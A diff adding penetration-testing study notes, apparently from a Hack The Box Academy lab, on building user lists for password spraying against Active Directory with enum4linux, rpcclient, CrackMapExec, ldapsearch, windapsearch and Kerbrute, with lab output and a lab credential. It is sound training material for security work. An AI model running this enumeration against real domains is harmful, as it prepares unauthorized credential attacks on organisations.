@@ -6,6 +6,11 @@
     - [Enumerating Password Policy - from Linux](#enumerating-password-policy---from-linux)
     - [Enumerating Password Policy - from Windows](#enumerating-password-policy---from-windows)
     - [Default Password Policy](#default-password-policy)
+  - [Password Spraying - Making a Target User List](#password-spraying---making-a-target-user-list)
+    - [SMB NULL Session to Pull User List](#smb-null-session-to-pull-user-list)
+    - [Gathering Users with LDAP Anonymous](#gathering-users-with-ldap-anonymous)
+    - [Enumerating Users with Kerbrute](#enumerating-users-with-kerbrute)
+    - [Credential Enumeration to Build your User List](#credential-enumeration-to-build-your-user-list)
 
 ---
 
@@ -363,3 +368,205 @@ The default password policy when a new domain is created is as follows, and ther
 | Account lockout duration | Not set |
 | Account lockout threshold | 0 |
 | Reset account lockout counter after | Not set |
+
+## Password Spraying - Making a Target User List
+
+To mount a successful password spraying attack, you first need a list of valid domain users to attempt to authenticate with. There are several ways:
+
+- by leveraging an SMB NULL Session to retrieve a complete list of domain users from the DC
+- utilizing an LDAP anonymous bind to query LDAP anonymously and pull down the domain user list
+- using a tool such as Kerbrute to validate users utilizing a word list from a source such as the [statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames) GitHub repo, or gathered by using a tool such as [linkedin2usernames](https://github.com/initstring/linkedin2username) to create a list of potentially valid users
+- using a set of credentials from a Linux or Windows attack system either provided by your client or obtained through another means such as LLMNR/NBT-NS response poisoning using Responder or even a successful password spray using a smaller wordlist
+
+No matter the method you choose, it is also vital for you to consider the domain password policy. If you have an SMB NULL session, LDAP anonymous bind, or a set of valid credentials, you can enumerate the password policy. Having this policy in hand is very useful because the minimum password length and whether or not password complexity is enabled can help you formulate the list of passwords you will try in your spray attempts. Knowing the account lockout threshold and bad password timer will tell you how many spray attempts you can do at a time without locking out any accounts and how many minutes you should wait between spray attempts.
+
+Regardless of the method you choose, and if you have the password policy or not, you must always keep a log of your activities, including, but not limited to:
+
+- the accounts targeted
+- DC used in the attack
+- time of the spray
+- date of the spray
+- password(s) attempted
+
+This will help you ensure that you do not duplicate efforts. If an account lockout occurs or your client notices suspicious logon attempts, you can supply them with your notes to crosscheck against their logging systems and ensure nothing nefarious was going on in the network.
+
+### SMB NULL Session to Pull User List
+
+If you are on an internal machine but don't have valid domain credentials, you can look for SMB NULL sessions or LDAP anonymous binds on DC. Either of these will allow you to obtain an accurate list of all users within AD and the password policy. If you already have credentials for a domain user or SYSTEM access on a Windows host, then you can easily query AD for this information.
+
+It's possible to do this using the SYSTEM account because it can impersonate the computer. A computer object is treated as a domain user account. If you don't have a valid domain account, and SMB NULL sessions and LDAP anonymous binds are not possible, you can create a user list using external resources such as email harvesting and LinkedIn. This user list will not be as complete, but it may be enough to provide you with access to AD.
+
+Some tools that can leverage SMB NULL sessions and LDAP anonymous binds include enum4linux, rpcclient, and CrackMapExec, among others. Regardless of the tool, you'll have to do a bit of filtering to clean up the output and obtain a list of only usernames, one on each line. You can do this with enum4linunx with the ```-U``` flag.
+
+```bash
+d41y@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+
+administrator
+guest
+krbtgt
+lab_adm
+htb-student
+avazquez
+pfalcon
+fanthony
+wdillard
+lbradford
+sgage
+asanchez
+dbranch
+ccruz
+njohnson
+mholliday
+
+<SNIP>
+```
+
+You can use the ```enumdomusers``` command after connecting anonymously using rpcclient.
+
+```bash
+d41y@htb[/htb]$ rpcclient -U "" -N 172.16.5.5
+
+rpcclient $> enumdomusers 
+user:[administrator] rid:[0x1f4]
+user:[guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[lab_adm] rid:[0x3e9]
+user:[htb-student] rid:[0x457]
+user:[avazquez] rid:[0x458]
+
+<SNIP>
+```
+
+Finally, you can use CrackMapExec with the ```--users``` flag. This is useful tool that will also show the ```badpwdcount```, so you can remove any accounts from your list that are close to the lockout threshold. It also shows the ```badpwdtime```, which is the date and time of the last bad password attempt, so you can see how close an account is to having its ```badpwdcount``` reset. In an environment with multiple DCs, this value is maintained separately on each one. To get an accurate total of the account's bad password attempts, you would have to either query each DC and use the sum of the values or query the DC with the PDC Emulator FSMO role.
+
+```bash
+d41y@htb[/htb]$ crackmapexec smb 172.16.5.5 --users
+
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 0 baddpwdtime: 2022-01-10 13:23:09.463228
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 0 baddpwdtime: 2022-02-17 22:59:22.684613
+
+<SNIP>
+```
+
+### Gathering Users with LDAP Anonymous
+
+You can use various tools to gather users when you find an LDAP anonymous bind. Some examples include windapsearch and ldapsearch. If you choose to use ldapsearch you will need to specify a valid LDAP search filter.
+
+```bash
+d41y@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+
+guest
+ACADEMY-EA-DC01$
+ACADEMY-EA-MS01$
+ACADEMY-EA-WEB01$
+htb-student
+avazquez
+pfalcon
+fanthony
+wdillard
+lbradford
+sgage
+asanchez
+dbranch
+
+<SNIP>
+```
+
+Tools such as windapsearch make this easier. Here you can specify anonymous access by providing a blank username with the ```-u``` flag and the ```-U``` flag to tell the tool to retrieve just users.
+
+```bash
+d41y@htb[/htb]$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+
+[+] No username provided. Will try anonymous bind.
+[+] Using Domain Controller at: 172.16.5.5
+[+] Getting defaultNamingContext from Root DSE
+[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
+[+] Attempting bind
+[+]	...success! Binded as: 
+[+]	 None
+
+[+] Enumerating all AD users
+[+]	Found 2906 users: 
+
+cn: Guest
+
+cn: Htb Student
+userPrincipalName: htb-student@inlanefreight.local
+
+cn: Annie Vazquez
+userPrincipalName: avazquez@inlanefreight.local
+
+cn: Paul Falcon
+userPrincipalName: pfalcon@inlanefreight.local
+
+cn: Fae Anthony
+userPrincipalName: fanthony@inlanefreight.local
+
+cn: Walter Dillard
+userPrincipalName: wdillard@inlanefreight.local
+
+<SNIP>
+```
+
+### Enumerating Users with Kerbrute
+
+If you have no access at all from your position in the internal network, you can use Kerbrute to enumerate valid AD accounts and for password spraying.
+
+This tool uses Kerberos Pre-Authentication, which is a much faster and potentially stealthier way to perform password spraying. This method does not generate Windows event ID 4625: "An Account failed to log on", or a logon failure which is often monitored for. The tool sends TGT requests to the DC without Kerberos Pre-Authentication to perform username enumeration. If the KDC responds with the error ```PRINCIPAL UKNOWN```, the username is invalid. Whenever the KDC prompts for Kerberos Pre-Authentication, this signals that the username exists, and the tool will mark it as valid. This method of username enumeration does not cause logon failures and will not lock out accounts. However, once you have a list of valid users and switch gears to use this tool for password spraying, failed Kerberos Pre-Authentication attempts will count towards an account's failed login accounts and can lead to account lockout, so you still must be careful regardless of the method chosen.
+
+```bash
+d41y@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (9cfb81e) - 02/17/22 - Ronnie Flathers @ropnop
+
+2022/02/17 22:16:11 >  Using KDC(s):
+2022/02/17 22:16:11 >  	172.16.5.5:88
+
+2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
+2022/02/17 22:16:11 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
+2022/02/17 22:16:11 >  [+] VALID USERNAME:	 tjohnson@inlanefreight.local
+2022/02/17 22:16:11 >  [+] VALID USERNAME:	 jwilson@inlanefreight.local
+2022/02/17 22:16:11 >  [+] VALID USERNAME:	 bdavis@inlanefreight.local
+2022/02/17 22:16:11 >  [+] VALID USERNAME:	 njohnson@inlanefreight.local
+2022/02/17 22:16:11 >  [+] VALID USERNAME:	 asanchez@inlanefreight.local
+2022/02/17 22:16:11 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
+2022/02/17 22:16:11 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
+
+<SNIP>
+```
+
+Using Kerbrute for username enumeration will generate event ID 4768: "A Kerberos authentication ticket (TGT) was requested". This will only be triggered if Kerberos event logging is enabled via Group Policy. Defenders can tune their SIEM tools to look for an influx of this event ID, which may indicate an attack. If you are successful with this method during a pentest, this can be an excellent recommendation to add to your report.
+
+### Credential Enumeration to Build your User List
+
+With valid credentials, you can use any of the tools stated previously to build a user list.
+
+```bash
+d41y@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
+
+[sudo] password for htb-student: 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\htb-student:Academy_student_AD! 
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] Enumerated domain user(s)
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\administrator                  badpwdcount: 1 baddpwdtime: 2022-02-23 21:43:35.059620
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\guest                          badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\lab_adm                        badpwdcount: 0 baddpwdtime: 2021-12-21 14:10:56.859064
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\krbtgt                         badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\htb-student                    badpwdcount: 0 baddpwdtime: 2022-02-22 14:48:26.653366
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\avazquez                       badpwdcount: 20 baddpwdtime: 2022-02-17 22:59:22.684613
+SMB         172.16.5.5      445    ACADEMY-EA-DC01  INLANEFREIGHT.LOCAL\pfalcon                        badpwdcount: 0 baddpwdtime: 1600-12-31 19:03:58
+
+<SNIP>
+```
